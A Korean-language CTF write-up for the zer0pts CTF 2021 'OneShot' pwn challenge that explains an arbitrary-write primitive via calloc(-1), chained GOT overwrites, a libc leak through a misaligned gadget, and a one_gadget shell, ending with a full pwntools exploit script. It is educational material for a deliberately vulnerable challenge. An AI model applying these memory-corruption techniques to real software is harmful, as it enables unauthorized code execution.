---
layout: post
title: zer0pts CTF 2021 OneShot write-up
categories: ctf-write-up
tags: [ctf]
---


## OneShot (192pts, 23solves)

---

### Summary

1. calloc(-1, ...) is return 0
2. puts_got → main
3. exit_got → 0x400846
4. setbuf_got → puts_plt+6 (leak!)
5. alarm_got → main+1
6. puts_got → one_gadget

---

정말 힘들게 풀었다. 이게 이렇게 푸는게 맞는건가란 생각을 되게 많이했다. 진짜 이 문제를 풀기 위해 별의 별 시도를 다 해봤지만 너무 길어지기에 생략한다.



calloc의 반환 값을 기준으로 원하는 offset에 4바이트씩 값을 넣을 수 있다. calloc 인자로 -1을 주면 0을 반환하기 때문에 0에서부터 원하는 offset에 값을 쓸 수 있고 이를 이용하면 GOT 영역에 값을 쓸 수 있다.



또한 calloc의 인자에 0xa000을 주면 libc 영역에 할당되어서 libc쪽 주소도 변조가 가능한데, 이를 이용해서 다양한 작업도 가능했지만 결과적으로 exploit시엔 사용하지 않았다.



일단 이 문제에서 우리가 변조 가능한 주소는 한정적이다. 무조건 4byte 단위로만 덮을 수 있기 때문에 덮다가 터지는 주소들이 몇개 있다. 이는 stdin, stdout, calloc, printf, scanf이다. 이를 제외하고 원하는 값을 덮을 수 있다.



가장 먼저 해야할 일은 puts_got를 main으로 덮어서 프로그램을 반복시키는 것이다. 그 후에 leak을 어떻게 시키면 좋을지 생각하다가 setbuf를 이용하기로 했다.



setbuf는 init_array에 등록된 setup 함수에 의해 호출되는데 이 함수 내부의 opcode를 조금 다르게 끊어서 보면 이런 가젯이 있다.

```assembly
.text:0000000000400846                 add    eax,0x200815
.text:000000000040084A                 mov    rsi, 0
.text:0000000000400850                 mov    rdi, rax
.text:0000000000400853                 call   setbuf@plt
```



이런 이상한 가젯을 사용하게 된 이유는 저 주소로 이동하게 되면 그 이후에 ret를 만나면서 스택의 최상단에 있는 주소로 이동하는데 그 주소와 eax에 들어가 있는 주소와 동일하다. 



우리가 leak할 libc 주소는 bss 영역에 저장되어 있고 그 주소들은 0x601000 영역인데, 저 가젯을 이용한다면 0x400000 영역으로 이동하는 동시에 0x601000 영역의 주소를 출력할 수 있게 된다.



여러 주소를 테스트해보다가 eax 값을 0x40082b로 주면 릭이 되는 동시에 `call alarm`으로 이동하는 것을 확인 했다.



그럼 일단 eax를 조작할 수 있어야한다. exit_got를 위의 가젯으로 변조한 뒤 scanf에서 0x40082b를 넣으면 eax에 해당 값이 담기면서 이동한다. 이 코드를 보면 이해가 될 것이다.

```assembly
.text:0000000000400766                 lea     rax, [rbp+var_10]
.text:000000000040076A                 mov     rsi, rax
.text:000000000040076D                 lea     rdi, aD         ; "%d"
.text:0000000000400774                 mov     eax, 0
.text:0000000000400779                 call    ___isoc99_scanf
.text:000000000040077E                 mov     eax, [rbp+var_10]
.text:0000000000400781                 cmp     eax, 0FFh
.text:0000000000400786                 jle     short loc_400792
.text:0000000000400788                 mov     edi, 1          ; status
.text:000000000040078D                 call    _exit
```



그리고 또 중요한 것이 setbuf 주소를 printf_plt로 주면 printf의 구조적인 문제로 인해 프로그램이 터지게된다. 그렇다고 puts_plt를 줘버리면 이미 puts는 main으로 변조되어 있다. 하지만 이때 puts_plt+6 주소를 넣어주게 되면 puts가 정삭적으로 작동하게 된다.



이제 alarm을 main으로 변조해주고 leak된 주소를 특정 함수의 got에 넣어주면 될 거 같지만 alarm_got를 main으로 바꾸면 다시 printf의 구조적인 문제로 인해 터지게 된다. 근데 이는 main+1 주소로 해주면 해결 된다. (push rbp를 하지 않기 때문에)



그럼 이제 one_gadget 주소를 특정 함수의 got에 덮으면 되는데 원래 exit를 덮을려고 했으나 4바이트를 덮자마자 프로그램이 종료되었다. 그 이유는 위에서 setbuf를 puts_plt+6으로 덮음으로써 실제 puts_got에 puts의 실제주소가 쓰였기 때문이다.



그래서 더이상 main으로 돌아가지 않았다. 그러므로 puts의 하위 4바이트에 one_gadget을 넣음으로서 셸을 획득했다.

```python
from pwn import *

#p = process('./chall', env={'LD_PRELOAD':'./libc.so.6'})
p = remote("pwn.ctf.zer0pts.com", 9004)
e = ELF('./chall')

def go(a, b):
    p.sendlineafter('= ', '-1')
    p.sendlineafter('= ', str(a))
    p.sendlineafter('= ', str(b))

go(e.got['puts']/4, e.symbols['main'])
go(e.got['exit']/4, 0x400846)
go(e.got['setbuf']/4, e.plt['puts']+6)
go((e.got['setbuf']+4)/4, 0)
go(e.got['alarm']/4, 0x400738)
go((e.got['alarm']+4)/4, 0)
p.sendlineafter('= ', str(0x40082b))

libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x66230
print hex(libc_base)

one = libc_base + 0xe6e79
go(e.got['puts']/4, one & 0xffffffff)

p.interactive()
```
